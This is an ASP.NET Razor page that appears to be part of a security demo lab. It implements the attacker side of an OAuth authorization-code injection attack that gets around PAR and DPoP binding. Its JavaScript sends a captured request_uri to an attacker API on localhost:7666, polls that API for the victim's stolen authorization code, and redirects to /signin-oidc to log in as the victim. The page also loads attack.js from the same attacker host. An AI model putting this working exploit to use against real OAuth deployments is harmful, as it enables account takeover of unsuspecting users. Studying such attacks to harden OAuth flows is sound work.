@{
    ViewData["Title"] = "OAuth DPoP Attack - Attacker Mode";
}

<div class="container">
    <h1 class="text-danger">⚠️ OAuth DPoP Attack - Attacker Mode</h1>

    <div class="alert alert-warning">
        <strong>Warning:</strong> This page demonstrates a security vulnerability for educational purposes only.
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">Attacker Controls</h5>
            <div class="alert alert-info">
                <strong>Attack Steps (with PAR):</strong>
                <ol>
                    <li>Click "Initialize Attack"</li>
                    <li>Click "Start OAuth Flow" - this will redirect you to the authorize endpoint</li>
                    <li>⚠️ <strong>Copy the <code>request_uri</code> from the authorize URL</strong> (e.g., <code>urn:ietf:params:oauth:request_uri:...</code>)</li>
                    <li>Paste it below and submit (this sends it to the victim)</li>
                    <li>Wait for victim to authenticate on /Home/Secure (victim's browser will use your request_uri)</li>
                    <li>Click "Complete Login with Stolen Code" to complete the attack</li>
                </ol>
                <div class="alert alert-secondary mt-2">
                    <strong>Note:</strong> The <code>state</code> parameter is generated server-side and stored in your correlation cookie. When the victim's browser uses your <code>request_uri</code>, the Authorization Server will generate a new state for that session, which will be returned with the authorization code.
                </div>
                <div class="alert alert-warning mt-2">
                    <strong>Why PAR doesn't prevent this attack:</strong> The <code>request_uri</code> is visible in the front-channel and can be reused by the victim's browser. The parameters inside (dpop_jkt, code_challenge, nonce) are bound to the attacker's keys!
                </div>
            </div>
            <div id="controls">
                <button class="btn btn-danger" onclick="initAttacker()">Initialize Attack</button>
                <button class="btn btn-primary" onclick="startOAuthFlow()" disabled id="start-btn">Start OAuth Flow</button>
                <button class="btn btn-secondary" onclick="checkStatus()">Check Status</button>
            </div>
            <div class="mt-3">
                <strong>Session ID:</strong> <span id="session-id" class="text-monospace">Not initialized</span>
            </div>
        </div>
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">Capture request_uri (PAR)</h5>
            <p class="text-muted">After starting the OAuth flow, copy the <code>request_uri</code> from the authorize URL:</p>
            <div class="mb-3">
                <label for="request-uri-input" class="form-label"><strong>request_uri:</strong></label>
                <input type="text" class="form-control" id="request-uri-input" placeholder="e.g., urn:ietf:params:oauth:request_uri:6esc_11ACC5bwc014ltc14eY22c">
                <small class="form-text text-muted">Look for <code>request_uri=...</code> in the browser address bar</small>
            </div>
            <div class="alert alert-info">
                <strong>Note:</strong> The <code>state</code> parameter is automatically generated server-side and stored in your correlation cookie. You don't need to capture it separately.
            </div>
            <button class="btn btn-warning" onclick="submitRequestUri()" disabled id="submit-jkt-btn">Submit request_uri</button>
        </div>
    </div>

    <div class="card mb-3">
        <div class="card-body">
            <h5 class="card-title">Complete Attack</h5>
            <p class="text-muted">After the victim authenticates and their code is stolen:</p>
            <button class="btn btn-success" onclick="injectStolenCode()" disabled id="inject-btn">Complete Login with Stolen Code</button>
        </div>
    </div>

    <div class="card">
        <div class="card-body">
            <h5 class="card-title">Status</h5>
            <pre id="status" style="background: #f5f5f5; padding: 10px; border-radius: 4px; max-height: 300px; overflow-y: auto;">Ready. Click "Initialize Attack" to begin.</pre>
        </div>
    </div>
</div>

<script src="https://localhost:7666/attack.js"></script>
<script>
    let attackInstance = null;

    function initAttacker() {
        attackInstance = new OAuthAttack();
        attackInstance.initAttacker();

        document.getElementById('session-id').textContent = attackInstance.sessionId;
        document.getElementById('start-btn').disabled = false;
        document.getElementById('submit-jkt-btn').disabled = false;
        document.getElementById('inject-btn').disabled = false;

        updateStatus('Attacker mode initialized. Session ID: ' + attackInstance.sessionId);

        // Start polling for stolen code
        setInterval(checkStatus, 3000);
    }

    function startOAuthFlow() {
        if (!attackInstance) {
            alert('Please initialize attack first');
            return;
        }
        
        updateStatus('Starting OAuth flow... You will be redirected to the authorize endpoint.\n\n⚠️ Copy the request_uri parameter from the URL (e.g., request_uri=urn:ietf:params:oauth:request_uri:...)');
        
        // Trigger the actual OAuth flow through the backend
        // This will cause the backend to generate code_verifier and store it in session
        window.location.href = '/Home/Secure';
    }
    
    async function submitRequestUri() {
        if (!attackInstance) {
            alert('Please initialize attack first');
            return;
        }

        const requestUri = document.getElementById('request-uri-input').value.trim();
        
        if (!requestUri) {
            alert('Please enter a request_uri value');
            return;
        }

        updateStatus(`Submitting request_uri:\nrequest_uri: ${requestUri}`);

        try {
            const response = await fetch(`https://localhost:7666/api/attack/par`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: attackInstance.sessionId,
                    requestUri: requestUri
                })
            });

            if (response.ok) {
                updateStatus('✓ Successfully submitted request_uri!\n\nThe victim can now use this request_uri to authorize with YOUR parameters (dpop_jkt, code_challenge, nonce).');
                document.getElementById('request-uri-input').style.borderColor = '#28a745';
            } else {
                updateStatus('✗ Failed to submit request_uri: ' + response.statusText);
            }
        } catch (error) {
            console.error('Failed to submit request_uri:', error);
            updateStatus('✗ Error submitting request_uri: ' + error.message);
        }
    }

    async function injectStolenCode() {
        if (!attackInstance) {
            alert('Please initialize attack first');
            return;
        }

        updateStatus('Fetching stolen authorization code...');

        try {
            // Fetch the stolen code
            const response = await fetch(`https://localhost:7666/api/attack/code/${attackInstance.sessionId}`);
            
            if (!response.ok) {
                updateStatus('❌ No stolen code available yet. Status: ' + response.status);
                alert('No stolen code available yet. Make sure the victim has authenticated on /Home/Secure.');
                return;
            }

            const codeData = await response.json();
            updateStatus(`✅ Got stolen code: ${codeData.code.substring(0, 20)}...\n\nRedirecting to OAuth callback with stolen code...`);
            
            // Redirect to the OAuth callback endpoint with the stolen code and state
            // The state comes from the Authorization Server response (stored with the code)
            // The backend will retrieve the code_verifier from the attacker's correlation cookie and complete the exchange
            const callbackUrl = `/signin-oidc?code=${encodeURIComponent(codeData.code)}&state=${encodeURIComponent(codeData.state)}`;
            window.location.href = callbackUrl;
            
        } catch (error) {
            updateStatus('❌ Error fetching code: ' + error.message);
            console.error('Error:', error);
        }
    }

    async function checkStatus() {
        if (!attackInstance) return;

        try {
            const response = await fetch(`https://localhost:7666/api/attack/status/${attackInstance.sessionId}`);
            const status = await response.json();

            updateStatus(JSON.stringify(status, null, 2));

            // Enable inject button if we have a code
            if (status.hasAuthCode) {
                document.getElementById('inject-btn').classList.remove('btn-success');
                document.getElementById('inject-btn').classList.add('btn-warning');
                document.getElementById('inject-btn').textContent = '⚡ Stolen Code Available - Click to Use!';
            }
        } catch (error) {
            console.error('Failed to check status:', error);
        }
    }

    function updateStatus(message) {
        document.getElementById('status').textContent = message;
    }

    // Auto-initialize if coming from AttackerApi
    window.addEventListener('DOMContentLoaded', () => {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('auto') === 'true' || document.referrer.includes('7666')) {
            setTimeout(() => {
                initAttacker();
                updateStatus('Auto-initialized from AttackerApi. Click "Start OAuth Flow" to begin.');
            }, 500);
        }
    });
</script>

